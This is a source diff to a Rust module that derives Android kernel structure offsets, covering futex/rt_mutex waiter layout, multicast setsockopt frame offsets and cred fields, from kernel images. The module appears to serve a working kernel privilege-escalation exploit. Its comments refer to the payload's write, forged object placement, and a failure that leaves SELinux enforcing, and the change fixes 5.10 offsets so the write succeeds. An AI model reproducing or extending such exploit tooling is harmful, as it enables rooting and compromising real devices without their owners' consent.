@@ -1,4 +1,4 @@
-﻿//! Disassembly-driven derivation: pselect/futex waiter layout and the
+//! Disassembly-driven derivation: pselect/futex waiter layout and the
 //! nf_logger slide slot. Direct ports of the Python analysis.
 
 use std::collections::{BTreeMap, BTreeSet};
@@ -194,8 +194,10 @@ fn waiter_local_from_dis(lines: &[String], pi_tree_entry: u64) -> Option<u64> {
     None
 }
 
-/// Static one-shot multicast `waiter_off` for the target image:
-/// `(闁?setsockopt_frames 闂?greqs_off) 闂?(闁?futex_frames 闂?waiter_local_off)`.
+/// Static one-shot multicast `waiter_off` for the target image, from the two
+/// call frames the payload path walks through:
+/// `setsockopt_frames - ip_setsockopt` plus `futex_frames - futex_wait_requeue_pi`
+/// measured against the parent frames' locals.
 /// Validated to reproduce the A301SO hardware value (`0x60`).
 pub fn multicast_waiter_off(
     kernel: &[u8],
@@ -206,15 +208,9 @@ pub fn multicast_waiter_off(
 ) -> Result<McastWaiterGeometry> {
     for name in SETSOCKOPT_CHAIN.iter().chain(FUTEX_CHAIN.iter()) {
         let dis = disassemble_symbol(kernel, symbols, sorted, name, OBJDUMP_CAP)?;
-        let mut this_va: u64 = 0;
-        for (sym, addrs) in symbols.iter() {
-            if sym == name {
-                if let Some(a) = addrs.iter().next() { this_va = *a; }
-            }
-        }
         for l in &dis {
             let t = l.trim();
-            if (t.contains("bl ") || t.starts_with("b ")) && !t.contains("bl ") == false || t.starts_with("b ") {
+            if t.contains("bl ") || t.starts_with("b ") {
                 if let Some(addr_part) = t.split_whitespace().nth(1) {
                     if let Ok(target) = u64::from_str_radix(addr_part.trim_start_matches("0x"), 16) {
                         // find callee name
@@ -355,8 +351,8 @@ pub fn multicast_waiter_off(
 #[cfg(test)]
 mod tests {
     use super::{
-        multicast_geometry_5x, multicast_geometry_btf_only, remove_waiter_uses_current,
-        select_cred_caps, select_cred_refs,
+        multicast_compact_kind, multicast_geometry_5x, multicast_geometry_btf_only,
+        remove_waiter_uses_current, select_cred_caps, select_cred_refs,
     };
     use std::collections::BTreeMap;
 
@@ -406,7 +402,7 @@ mod tests {
         let mut structs: BTreeMap<String, Option<u32>> = BTreeMap::new();
         structs.insert("waiter_task".to_string(), Some(48));
         structs.insert("waiter_lock".to_string(), Some(56));
-        let geometry = multicast_geometry_5x(&structs);
+        let geometry = multicast_geometry_5x(&structs, 1);
         assert_eq!(geometry.first(), Some(&("waiter_off", 96)));
         assert!(geometry.contains(&("task_offset", 48)));
         assert!(geometry.contains(&("lock_offset", 56)));
@@ -418,9 +414,19 @@ mod tests {
         assert!(geometry.contains(&("compact_waiter", 1)));
 
         let without: BTreeMap<String, Option<u32>> = BTreeMap::new();
-        let geometry = multicast_geometry_5x(&without);
+        let geometry = multicast_geometry_5x(&without, 2);
         assert!(!geometry.iter().any(|(key, _)| *key == "task_offset"));
         assert!(!geometry.iter().any(|(key, _)| *key == "lock_offset"));
+        assert!(geometry.contains(&("compact_waiter", 2)));
+    }
+
+    #[test]
+    fn multicast_compact_kind_follows_the_5_10_split() {
+        assert_eq!(multicast_compact_kind("5.10.149-android12-9-00001-gda3d81545d1d"), 2);
+        assert_eq!(multicast_compact_kind("5.10.157-android13-4-00001-g5c7ff5dc7aac"), 2);
+        assert_eq!(multicast_compact_kind("5.15.189-android13-4"), 1);
+        assert_eq!(multicast_compact_kind("6.1.145-android14-11"), 1);
+        assert_eq!(multicast_compact_kind(""), 1);
     }
 
     #[test]
@@ -1113,19 +1119,47 @@ pub fn derive_cred_5x(btf: &Btf, kernel: &[u8], init_cred_off: u64) -> Result<Cr
 
 /// The train-corroborated 5.x multicast geometry: the frame/copy-window fields
 /// (`waiter_off`, `buffer_size`), the BTF-derived `rt_mutex_waiter` field
-/// offsets, and the compact-waiter flag. These hold across devices on the same
-/// train. A missing BTF value omits that key so the built-in profile can
+/// offsets, and the compact-waiter ordinal. These hold across devices on the
+/// same train. A missing BTF value omits that key so the built-in profile can
 /// supply it.
+///
+/// `compact_waiter` is a layout ordinal, not a boolean: 0 is the 6.6 rb_node
+/// waiter, 1 the 6.1-and-later compact one, 2 the 5.10 one (native
+/// `Profile::compact_waiter_kind()`, `kernel/waiter_layout.hpp`). 5.10 and the
+/// rest disagree past offset 0x40, so the caller must pass the ordinal that
+/// matches the image; see [`multicast_compact_kind`].
 pub fn multicast_geometry_corroborated(
     structs: &BTreeMap<String, Option<u32>>,
+    compact_waiter: i64,
 ) -> Vec<(&'static str, i64)> {
     let mut geometry: Vec<(&'static str, i64)> = vec![
         ("waiter_off", MULTICAST_5X_WAITER_OFF),
         ("buffer_size", MULTICAST_5X_BUFFER_SIZE),
     ];
     geometry.extend(multicast_waiter_field_offsets(structs));
-    geometry.push(("compact_waiter", 1));
+    geometry.push(("compact_waiter", compact_waiter));
     geometry
+}
+
+/// The compact-waiter ordinal for a 5.x image, from its release string.
+///
+/// 5.10 stable keeps `struct rt_mutex_waiter` at the short shape: `task` 0x30,
+/// `lock` 0x38, `prio` 0x40, `deadline` 0x48, no `wake_state`, no `ww_ctx`.
+/// That is ordinal 2. Every other 5.x train the extractor supports (5.15
+/// vendor kernels) was measured with the longer shape, ordinal 1. Emitting 1
+/// for a 5.10 kernel is not a cosmetic error: the payload's `prio > 120` erase
+/// gate reads the padding half of the word, never opens, and the write silently
+/// does not happen (on-device symptom: `Write 1 failed` with SELinux still
+/// enforcing).
+#[must_use]
+pub fn multicast_compact_kind(release: &str) -> i64 {
+    let mut parts = release.split('.');
+    let major = parts.next().and_then(|part| part.parse::<u32>().ok());
+    let minor = parts.next().and_then(|part| part.parse::<u32>().ok());
+    match (major, minor) {
+        (Some(5), Some(10)) => 2,
+        _ => 1,
+    }
 }
 
 fn multicast_waiter_field_offsets(
@@ -1144,8 +1178,11 @@ fn multicast_waiter_field_offsets(
 /// Full 5.x multicast geometry for the exact validated release. The forged
 /// object placement is no longer emitted (resident writer removed), so the
 /// geometry equals the train-corroborated set.
-pub fn multicast_geometry_5x(structs: &BTreeMap<String, Option<u32>>) -> Vec<(&'static str, i64)> {
-    multicast_geometry_corroborated(structs)
+pub fn multicast_geometry_5x(
+    structs: &BTreeMap<String, Option<u32>>,
+    compact_waiter: i64,
+) -> Vec<(&'static str, i64)> {
+    multicast_geometry_corroborated(structs, compact_waiter)
 }
 
 /// BTF-only part of the 5.x multicast geometry for releases with no verified
